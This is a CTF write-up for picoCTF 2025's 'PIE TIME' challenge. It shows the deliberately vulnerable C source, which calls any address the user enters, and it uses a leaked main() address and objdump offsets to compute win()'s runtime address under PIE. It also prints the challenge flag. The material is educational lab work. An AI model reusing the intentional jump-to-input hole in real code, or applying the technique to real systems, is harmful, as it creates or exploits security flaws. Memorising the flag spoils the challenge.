## PIE TIME

**Platform:** picoCTF 2025

**Author:** DARKRAICG492

**Category:**  Binary Exploitation

**Difficulty:** Easy

Tags:
#picoCTF_2025 
#Binary_Exploitation 
#Easy 

---

## Description

Can you try to get the flag? Beware we have PIE!

Additional details will be available after launching your challenge instance.

Connect to the program with netcat:

$ nc rescued-float.picoctf.net 59818

The program's source code can be downloaded here. The binary can be downloaded here.

---

## Hints
- Can you figure out what changed between the address you found locally and in the server output?

---

## Analysis

This challenge demonstrates a classic scenario involving PIE (Position Independent Executable) combined with ASLR and function pointer invocation. The executable leaks the address of main() at runtime, allowing us to compute the PIE base. Since the static offsets of all functions are fixed inside the ELF file, the address of win() can be obtained by adding its static offset to the PIE base.

---

## Methodology

**Step 1:** Download the file 

**Step 2:** Make both file executable 

<img width="664" height="195" alt="image" src="https://github.com/user-attachments/assets/d35f8e78-e2bc-4215-a868-a9b31af32d59" />

**Step 3:** Inspect the Source Code

`cat vuln.c `

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}   
```

**Step 4:** Run the Binary

```
Address of main: 0x55c7305e433d
Enter the address to jump to, ex => 0x12345:

```

**Step 5:** Extract Static Offsets Using objdump

List the function offsets inside the ELF:

`objdump -d vuln | grep main`

`objdump -d vuln | grep win`


<img width="858" height="253" alt="image" src="https://github.com/user-attachments/assets/682be688-8224-469c-aa5c-57c7ea3542fb" />

000000000000133d <main>:
00000000000012a7 <win>:

Compute offset:

```
offset = win_offset - main_offset
offset = 0x12a7 - 0x133d
offset = -0x96
```

PIE changes the load address, but not the internal function layout.

Meaning:
main() and win() will always be 0x96 bytes apart at runtime.

This invariant relationship allows us to compute the address of win() on any machine.

Step 6: Run the Program Locally to Verify Leak

Address of main: 0x56384b79b33d

```
PIE_base = local_leaked_main - main_offset
         = 0x56384b79b33d - 0x133d
         = 0x56384b79a000
```

```
win_runtime = PIE_base + win_offset
            = 0x56384b79a000 + 0x12a7
            = 0x56384b79b2a7
```

Check:

```
Local main: 0x56384b79b33d
Local win: 0x56384b79b2a7
Difference: 0x96 → correct.

main - win = 0x96   (correct)

```

This confirms our calculations are correct.

We replicate at runtime what the loader does internally.

We validate that our computed win() address has the correct 0x96 gap from main().

            
Step 7: Compute Remote Address

```
remote_win_runtime = remote_leaked_main - 0x96

Address of main: 0x607c29fc133d

remote_win_runtime = remote_leaked_main - 0x96
            = 0x607c29fc12a7
```
            
<img width="668" height="120" alt="image" src="https://github.com/user-attachments/assets/7bd0a7e4-5e8d-40f2-8b06-ea9207944baf" />

PIE randomizes the base differently on the remote server.

But the offset between main and win is guaranteed to remain identical.

Subtracting the offset reconstructs the correct remote win() address.

---

## Flag

picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_fec8b8c5}
picoCTF{b4s-----------8c5}

---

## Reflection

This challenge is an excellent introduction to exploiting PIE binaries using information leakage. Instead of relying on brute force or memory corruption, the solution depends entirely on understanding how ELF offsets remain constant even when PIE randomizes the binary’s load address.

By extracting function offsets from the disassembly and combining them with the leaked runtime address of main(), we can precisely compute the runtime address of win(). This reinforces the importance of knowing how ASLR and PIE interact and how attackers (or CTF players) can still execute arbitrary code through function pointers or GOT overwrite techniques. The challenge effectively highlights foundational concepts used repeatedly in binary exploitation.

---

## Tools

objdump	- Retrieve disassembly and function offsets inside the ELF binary

nc (netcat)	- Connect to remote service to exploit the challenge

chmod	- Set executable permissions


----

## References

[PIE and ASLR Explained](https://ctf101.org/binary-exploitation/position-independent-executables/)

[objdump usage guide](https://man7.org/linux/man-pages/man1/objdump.1.html)

[Function pointer exploitation overview](https://shogunlab.gitbook.io/ctf/binary/function-pointers)

[ASLR Concept](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-security_guide-implementing_aslr)
